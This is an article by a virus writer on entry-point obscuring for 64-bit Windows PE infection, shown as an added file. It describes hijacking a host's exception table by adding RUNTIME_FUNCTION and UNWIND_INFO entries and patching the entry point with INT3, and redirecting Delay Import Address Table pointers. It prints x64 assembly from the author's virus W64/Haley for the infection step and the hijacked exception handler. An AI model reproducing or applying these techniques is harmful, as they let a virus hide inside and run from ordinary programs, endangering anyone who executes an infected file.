@@ -1,0 +1,96 @@
+
+                           EPO In Windows
+                               64-bit
+                               by hh86
+
+
+Exception Handling in 64-bit
+
+While Windows 64-bit supports Vectored Exception Handling  they  also  have
+a mechanism which is integrated in the PE structure.   The  Exception Table
+RVA (can be found in Exception Directory entry, if there is any) points  to
+an array of RUNTIME_FUNCTION structures, each one holds the address  of the
+beginning  and the end of a function or some code that is protected  by  an
+exception handler, and an address to an UNWIND_INFO structure.
+
+
+How do we use it
+
+We can simply add a new RUNTIME_FUNCTION entry and an UNWIND_INFO, here  is
+an example from W64/Haley:
+
+        mov     eax, dword ptr [rax + IMAGE_NT_HEADERS.OptionalHeader64.AddressOfEntryPoint]
+        stos    dword ptr [rdi]              ;beginning address
+        inc     eax                          ;entrypoint + sizeof INT3
+        stos    dword ptr [rdi]              ;ending address
+        lea     eax, dword ptr [edx + sizeof IMAGE_RUNTIME_FUNCTION_ENTRY]
+        stos    dword ptr [rdi]              ;unwind struct address
+        push    rax
+        push    00011001b                    ;UNWIND_INFO: UNW_FLAG_EHANDLER (exception handler) + UNW_FLAG_UHANDLER (termination handler) and version 1 of UNWIND_INFO
+        pop     rax
+        stos    dword ptr [rdi]              ;flags
+        pop     rax
+        add     eax, 8
+        stos    dword ptr [rdi]              ;appended code entrypoint
+
+The above code sets the host's entrypoint as beginning address and the same
+plus 1 (only 1 byte of code is protected, conveniently in our case just the
+code that causes the exception) as the end address. Then UNWIND_INFO is set
+as a two fields struct.   We just need to set the flag that describes it as
+an exception handler, and an address to the exception address (virus code).
+Then the virus overwrites the first byte in the entrypoint code with an INT
+3 instruction to cause the exception.   Currently, I don't know if there is 
+an easier way to cause an exception that works, for  example, altering  the
+entrypoint address to an invalid but protected address does not work.
+
+The Exception Handler (which is the virus code) that I implemented:
+
+        push    60h                          ;PEB
+        pop     rsi
+        lods    qword ptr gs:[rsi]
+        mov     rcx, [r9]
+        mov     byte ptr [rcx], "h"          ;restore opcode
+        db      48h
+        db      89h
+        db      25h
+        dd      rip + (offset restore_rsp - offset delta_rsp) + 2
+                                             ;all code must be under delta_rsp! else fails occurs
+delta_rsp       label    near
+        jmp     find_ntkrn
+
+restore_rsp     label    near
+        mov     rsp, "rsprsp"
+        xor     rax, rax                     ;EXCEPTION_CONTINUE_EXECUTION++
+        ret
+
+Where r9 is the pointer to DISPATCHER_CONTEXT structure, the first field at
+offset 0x0 is ControlPc which is the address where the exception occurred.
+
+This technique was first used by my virus W64/Haley (check W64/Holey, Virus
+Bulletin, September 2011,  page 4-6 for a description of it),  released  in
+Valhalla issue #1.
+
+
+Delay Imports
+
+Windows  implements  an  alternative  mechanism  for  loading  DLLs.  It is
+statically  and it only happens  when the program uses an function from the
+DLL for  the  first  time, thus saving loading time.  The application calls
+a special  loader  function  using  a  pointer  in the Delay Import Address
+Table.  This  is  the pointer that we want to replace with a pointer to our
+code instead.
+
+
+How we do it
+
+The  address  of  the Delay Imports directory is an RVA in  Data Directory.
+At  offset  0xC  is  the RVA of the Delay Import Address Table.   The table
+contains an array of VAs to the functions  to be  called.  Replace  one  of
+those addresses and that's all.
+
+This technique was first used by my virus W32/Nova (check W32/Deelae, Virus
+Bulletin, November 2010, page 8-10 for a description of it). I haven't made
+a virus to implement this technique on 64-bit Windows.  Yet.  ;)
+
+hh86
+agonisthh86[@]gmail.com
